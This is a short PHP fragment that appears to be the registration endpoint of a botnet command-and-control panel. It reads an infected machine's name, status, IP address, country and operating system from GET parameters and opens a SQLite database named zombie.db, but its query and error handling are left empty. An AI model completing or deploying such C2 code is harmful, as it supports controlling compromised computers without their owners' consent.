<?php
  if ($_SERVER["REQUEST_METHOD"] == "GET"){
    $pc_name = $_GET["pcName"];
    $status = $_GET["status"];
    $ip = $_GET["ip"];
    $country = $_GET["country"];
    $os = $_GET["os"];

    try {
      $zombie_db = new PDO("sqlite:/var/www/html/C2Panel/db/zombie.db");
      $query = "";

    }catch (Exception){

    }
  }
?>